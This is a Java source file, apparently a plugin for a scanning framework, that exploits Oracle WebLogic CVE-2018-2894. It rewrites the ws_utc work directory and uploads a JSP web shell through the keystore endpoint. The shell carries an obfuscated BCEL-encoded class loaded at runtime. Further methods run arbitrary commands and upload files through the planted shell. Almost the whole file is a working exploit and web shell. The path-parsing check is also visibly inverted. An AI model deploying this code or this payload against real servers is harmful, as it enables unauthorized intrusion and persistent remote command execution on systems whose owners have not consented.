package com.gbw.scanner.plugins.scripts.weblogic.vuls;

import com.gbw.scanner.Host;
import com.gbw.scanner.http.GBWHttpClientBuilder;
import com.gbw.scanner.http.GBWHttpGetRequestBuilder;
import com.gbw.scanner.http.GBWHttpPostRequestBuilder;
import com.gbw.scanner.http.GBWHttpResponse;
import com.gbw.scanner.plugins.scripts.weblogic.GBWHttpShellClient;
import com.gbw.scanner.plugins.scripts.weblogic.GBWScanWeblogicConfig;
import com.gbw.scanner.plugins.scripts.weblogic.GBWWeblogicVersion;
import com.gbw.scanner.utils.HttpUtils;
import com.xmap.api.utils.TextUtils;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class GBWCVE_2018_2894 implements GBWEchoVul {

    private GBWScanWeblogicConfig config;
    public GBWCVE_2018_2894(GBWScanWeblogicConfig config){

        this.config = config;
    }

    private String getProto(Host host){

        String proto = host.getProto();

        if(TextUtils.isEmpty(proto)||proto.equals("t3")||proto.equals("iiop"))
            proto = "http";
        else if(proto.equals("t3s"))
            proto = "https";

        return proto;
    }

    private String getUploadPath(Host host){

        CloseableHttpClient httpClient = null;
        HttpGet httpGet = null;
        GBWHttpResponse httpResponse = null;
        String proto = getProto(host);
        try {

            httpClient = GBWHttpClientBuilder.make(proto,host.getPort());
            httpGet = new GBWHttpGetRequestBuilder(proto,host.getIp(),host.getPort(),"/ws_utc/resources/setting/options/general")
            .build();

            httpResponse = HttpUtils.send(httpClient,httpGet,true);
            if(httpResponse!=null){

                String result = httpResponse.getContent();
                if(TextUtils.isEmpty(result)){
                    Pattern p = Pattern.compile("<defaultValue>(.*?)</defaultValue>");
                    Matcher m = p.matcher(result);
                    if(m.find()){
                        String path=m.group(1);
                        String f=path.substring(0,path.indexOf("Domains")+8);
                        String e=path.substring(path.indexOf("Domains")+8);
                        if(path.indexOf("\\")!=-1){
                            return f+e.substring(0,e.indexOf("\\"))+"/servers\\AdminServer\\tmp\\_WL_internal\\bea_wls_internal\\9j4dqk\\war";
                        }else{
                            return f+e.substring(0,e.indexOf("/"))+"/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war";
                        }
                    }
                }
            }
        }catch (Exception e){


        }finally {

            if(httpClient!=null) {
                try {
                    httpClient.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

        return null;
    }

    private void setWorkHome(Host host,String path) {
        CloseableHttpClient httpClient = null;
        HttpPost httpPost = null;
        GBWHttpResponse httpResponse = null;
        String proto = getProto(host);

        try {
            httpClient = GBWHttpClientBuilder.make(proto,host.getPort());
            String data=String.format("setting_id=general&BasicConfigOptions.workDir=%s&BasicConfigOptions.proxyHost=&BasicConfigOptions.proxyPort=80",path);
            httpPost = new GBWHttpPostRequestBuilder(proto,host.getIp(),host.getPort(),"/ws_utc/resources/setting/options")
                    .postString(data,false)
            .build();

            HttpUtils.send(httpClient,httpPost);

        }catch (Exception e){

        }
        finally {
            if(httpClient!=null) {
                try {
                    httpClient.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

    }

    private String uploadShell(Host host) throws Exception {

        CloseableHttpClient httpClient = null;
        HttpPost httpPost = null;
        GBWHttpResponse httpResponse = null;
        String proto = getProto(host);

        try {

            httpClient = GBWHttpClientBuilder.make(proto,host.getPort());



            Map<String,String> headers=new HashMap<String,String>();
            headers.put("Content-Type","multipart/form-data; boundary=----WebKitFormBoundaryBu2MgJZqdQ4Gbmys");
            String data="------WebKitFormBoundaryBu2MgJZqdQ4Gbmys\n" +
                    "Content-Disposition: form-data; name=\"ks_filename\"; filename=\"cmd.jsp\"\n" +
                    "Content-Type: application/octet-stream\n" +
                    "\n" +
                    "<%@ page import=\"com.sun.org.apache.bcel.internal.util.ClassLoader\"%>\n" +
                    "<%@ page import=\"javax.servlet.http.*\"%>\n" +
                    "<%\n" +
                    "    String bcelCode=\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$f9$7b$h$d5$V$3d$p$8d4$TyB$e2$n6Q$W$TH$9c$c8$96eQ$Iij$F$d38$E$e2V6$c6J$C$s$a10$k$8f$edI$a4$Ze$96$d8jK$5b$I$Nk$LtM$ba$a5t$c1$d05$e9$a28$Y$fa$p$fd$be$fe$t$fd$X$f8$f8$9a$9e7$SB$O$Gb$5bo$ee$bb$ef$be$bb$9cs$ef$c8$ff$f9$df$3b$ff$Cp7$deKq1U$dc$d7$81$ZX$w$sR$d8$89Y$V$fbU$cc$a9$98Waw$e0$UN$a7$f0$F$94$85TI$c1$81$ab$a2$a8$a2$a0$e2$80$d0W$V$9cIA$87$a7$c0Oa$T$C$Fa$K$dd$c2$eb$d9$U$W$b0$u65q$f2u$b1$7cC$y$dfT$f1t$K$df$c2$b7E$b8$ef$a8xF$3c$9fUpN$c5s$w$be$ab$e2$bc$8a$e7Sx$B$_$8a$e5$a5$U$5e$c6$x$K$be$97B$Wf$K$df$c7$abBzM$y$af$8b$9b$3fP$f0C$F$3f$92$90$3c$60$3bv0$ya2S$3ce$9c5$W$f3$be$e5$9d$z$5bA$7e$3e$I$aa$f9$p$5cJ$N$c5$a4u$s$b4$fc$a0$f0$b9f$7e$d5u$7c$ab$d0w$5c$82$7c$c8$9d$b1$ql$u$da$8e5$kV$a6$z$ef$a81$5d$a6F$_$ba$a6Q$3enx$b6$d87$95q$b32$p$8eD$80$7c$d9p$e6$f2$a5$c0$b3$9d$b9$C$d3$f4$y$3f$y$H$f4X5$82y$3e$CkQ$ec$82Z$95$X$r$7e$ba$da$ae$j$5e4$adj$60$bbNA$98$cc$db$be$84$edE$3f$acZ$5e$c5p$f2U$a3Vv$8d$Z$bf$91$f5$bcU$$$d3$y$eeYg$q$ec$b9I$M$o$7bz$fd$7c$cc$9a$60HX_$K$M$f3$f4$98Q$8d$8a$8d$e0$ff$b1$82$9f$90Av$D$L$M$ab$o$v$a6$90$f9d$fd$9f$d4$Ip7$ce$dae$eb$e10$a8$86$B$b5$96Q$91$b0$a5ai$bb$f9$Ho8$THX$8b$96$va$f7$g$B$fa$d6$c2$5cv$8c$K$81$95$c9$KK$bd$f5$c4Z61$dbiA$cf$a8$a3N$7b$c0$f8t8K$93$T$p$U$cb$W$N$a5QJnH$e2no$5d$Z$a9$F$d6A$cf3j$ab$b2UpT$c1O$V$3c$c6$k$96$90$w$b9$a1gZ$a2$s$J$3b$5b$b4$N$K$l$3bf$3d$b7$b2$p$K$i$d5$3c$7d$ca2$D$N$f7$e0$C$B$d6p$R$8fh$f8$Z$7eN$84$X$e6$5d$a3bKH$d8$fe$f1$b0$cc$c4$dc$d3$q$40$c3$_0$a6aB$d8$fd$S$bfRpI$c3$af$f1$86$86$o$c6X$f5$gM$a5$e17$b8$ma$f3$a7A$z$82$bf$n$a1$db$P$9d$7c$c5$f6$cd$fc$c8$c1$d2$e1$7d$7b$l$b0L$O$83$c7$f8a0$9b$db$af$e0$b7$g$7e$87$dfkx$TK$o$e4$5b$g$de$c6$F$N$7f$Q$ce$V$d7$l$U$f0$x$f8$a3$86$3f$89$dc$fe$8c$bf$Q$bc$F$9b$e1$ff$8a$cbd$ffF6x$89L$N$92d$96$96$t$d11$9f$83$S$cb$99$K$aeh$f8$h$fe$$$8a$fc$87$82$7fj$a8$e3$w$t$e23$Z$m$fa$g$96qMd$f6$8e$86$V$bc$x$cazK$c2$d6$cf$98$a3UY5$98$90$d0$7bS$p$c5$be$bc$b9Q$fa$88$93$d5$ddFh2b$s$d6$cdY$c1$R$cb$88pN$d2$b3Qf$ebv$b5w$7c$p$adB$df$e34$f6$3f6$W$X$l$f5$ec$40$c8$b7e$faZ$ed9Ah$9b$H$85$b6$d0mj$S$ba$m$84$h$e2$b4$N$ea$86$aa$b0$8e$e6$ff$a8g$98$ad$S$i$96yl$b2$d8j$8c$e4L$qI$d8$7fs$ef$80$b5$GRk$f8$Y$Jgg$85$cb$ee$b5R$S$D$99$c8$9c$Y$R$b9$rf$cb$a1$e8$93$84Yv$F$b8$edmU$f3$D$8b$c8v$Q$9a$J$cf$r$ebA$8d$bb$c0$z$ba$L$96w$c8$Q$e6$9b2kf$a1$9a$ae$T$Y$b6C$f0$b7$b6gph$de$f0J$82p$c7$b4$o$K$3a$3f$3e$9b$M$9d$c0$W$_$9c$U$e3$b56$5d$ab$C4$d5$8c$90$c9$ac$f1$3ej7e$c6$a6$e5$fb$85U1$9aJ$J$b70$c6$aa$f6i$e7$7c$f5$5bL$e6s$a6$J$Y$df_$K$9f$a3$a3$C$3a$o$d1$g$j$9ae$88$x$ee$e0$d7$fb$dd$Q$3fqH$i$98$bd$5c$ef$F$a49$ee$93$d4$d6$fa$afB$ca$ea$b1k$88$c70$9e$7b$lZN$97$ebH$5c$c4$bdY$3d$Zi$87$e4$b4$fco$u$ba2$q$P$e8$aa$be$ee$gRq$a4$e5et$M$r$G$aeA$93$90N$d4$b1$7e$J$7br$fa$z$d1$d5$9e$ac$be$a1y5$abolH$89$b4$9cN$y$a3s$J$eax$ae$8e$5b$af0$R$ZU$f8$fc$bf$p$8e$7dL$e5Atr$ed$a6v3$d6$p$8d$z$fc$dd$85$ad$e8$c36$e4$d0$83$_$e2v$Mc$HFY$d41$dc$89$t$f9o$83M$8b$w2$f4$b2$h$B$f6$60$R$fd$b4$DNb$jOz$b1$l_$a2$bfat$60$88R$82w$3aQ$88t6$U$i$88t$eba$e2$3eJqz$Q$b6$f7S$o0$f82$OF$c0$d50$82C$ccVH$P$e00b$cc$U$8c$97$bc$ce$Ee$F$P$v8$a2$60T$c1W$80$P$a1$f3$f9$Bz$3e$c0$ce$R$F_$95$99$H$df$db$N$d0q$89$fe$85$ef$fe$Vl$9a$o$f0$5dc$D$x$e8$9e$ba$8a$db$b2$fa$e6e$a4$eb$d8R$c7$d6$81$3a$b6$f1$b3$7d$J$f2$d8$95$un$_$x$fc$I$a5$k$e6$N$M$d2o$k$dbqWDp$_i$cd$90$e6$3eF$R$d5$f7C$c4$dd$86q$3c$ccl$fb$a8$RU$c5$a2$TQ$3d$oIT$_E$b5$u$88$cd3Y$f0$S$bfv$9a$j$f2$U$9d$88P$e7$f5$9ee$7e$3df$df$c7$ael$j$3b$f4$3b$ea$b8$f3$o6$t$df$c3$ce$a9$b8$be$ab4$r$eb$bd$a5$a9D$7fi$J$5dM$e5n$a1$dc$T$v$c7$96$91a1$7du$f4$8fw$caxW$j$92$e3$fb$S$x$c8$b2$ea$81$a1d$$$cdf$cbM$edK$c4$$ac$3a$99$96$e3$5d$ec$a5$c1$a5$eb$ff$5d$a1$a7t$b2$8e$fcU$dcu$b9$u$5d$8e$80x$W$e7Z$40$M$92T$b0$84$q$a9$jfY$a3$yh$82D$96$b8$3b$c9rm$Sx$96$d4$9d$py$cf$b1L$B$cc$qT$da$3f$cd$a7$u$7d$98d$96p$94$c0$8c$d2$c71$i$a7$e7$J$ce$c8$a3x$8c$b5$97$I$ee$U$kg$83$9cdc$9d$e0$9a$a4$9f$G$94$o$97$f3Qs$n$Cp$_$S$l$oK$e6$lQ$f0$c4u$c1$R$e5$e8$ef$J$F_S$f0$a4$a4$e0$v$m$7d$j$g$q$d1$u$92$80$5b$82$c1$bb1L$ff$l$7dc$Yi$cc$L$A$A\";\n" +
                    "    new ClassLoader().loadClass(bcelCode).getConstructor(HttpServletRequest.class,HttpServletResponse.class).newInstance(request,response);\n" +
                    "%>\n" +
                    "------WebKitFormBoundaryBu2MgJZqdQ4Gbmys--";

            httpPost = new GBWHttpPostRequestBuilder(proto,host.getIp(),host.getPort(),"/ws_utc/resources/setting/keystore")
                    .addHeaders(headers)
                    .postString(data,false)
                    .build();

            httpResponse = HttpUtils.send(httpClient,httpPost,true);
            if(httpResponse!=null){

                String result = httpResponse.getContent();
                if(!TextUtils.isEmpty(result)){

                    Pattern p = Pattern.compile("<keyStoreItem><id>(\\d*)</id><keyStore>cmd.jsp</keyStore></keyStoreItem></options></section>");
                    Matcher m = p.matcher(result);
                    if(m.find()) {
                        return "/bea_wls_internal/config/keystore/"+m.group(1)+"_cmd.jsp";
                    }
                }
            }
        }catch (Exception e){

        }finally {
            if(httpClient!=null) {
                try {
                    httpClient.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

        return null;
    }

    @Override
    public GBWVulCheckResult scan(Host host) {

        try {
            String version = GBWWeblogicVersion.getVersion(config,host);
            String path = getUploadPath(host);
            setWorkHome(host,path);
            String shellPath=uploadShell(host);
            if(shellPath!=null){

                return new GBWVulCheckResult(version,
                        "CVE_2018_2894",
                        "CVE_2018_2894",
                        config.getCmd(),
                        shellPath,
                        "GBWCVE_2018_2894");

            }
        }catch (Exception e){
           e.printStackTrace();
        }
        return null;
    }

    @Override
    public String exec(Host host,String shellUrl,String cmd) {

        return GBWHttpShellClient.exec(host,shellUrl,cmd);
    }

    @Override
    public void upload(Host host,String shellUrl,String path, String text) {

        GBWHttpShellClient.upload(host,shellUrl,path,text);
    }

    @Override
    public void remove(Host host,String pname) {

    }

}
